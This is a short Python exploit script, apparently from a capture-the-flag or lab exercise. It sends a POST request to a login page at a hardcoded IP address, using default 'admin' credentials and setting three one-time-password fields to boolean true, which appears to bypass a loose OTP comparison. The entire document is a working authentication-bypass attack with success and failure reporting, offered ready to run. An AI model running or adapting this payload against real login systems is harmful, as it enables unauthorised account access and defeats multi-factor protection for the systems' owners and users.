import requests
import json

def exploit():
    url = "http://15.206.47.5:8080/login.php"

    payload = {
        "username": "admin",
        "password": "admin",
        "otp1": True,
        "otp2": True,
        "otp3": True 
    }
    
    print("[*] Sending exploit payload...")
    print(f"[*] Payload: {json.dumps(payload)}")
    print()
    
    try:
        response = requests.post(url, json=payload)
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response: {response.text}")
        print()
        
        if response.status_code == 200:
            data = response.json()
            if "message" in data:
                print(f"[+] SUCCESS! {data['message']}")
                return True
            else:
                print("[-] Unexpected response format")
                print(json.dumps(data, indent=2))
        else:
            print("[-] Request failed")
            print(response.text)
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return False
    
    return False

exploit()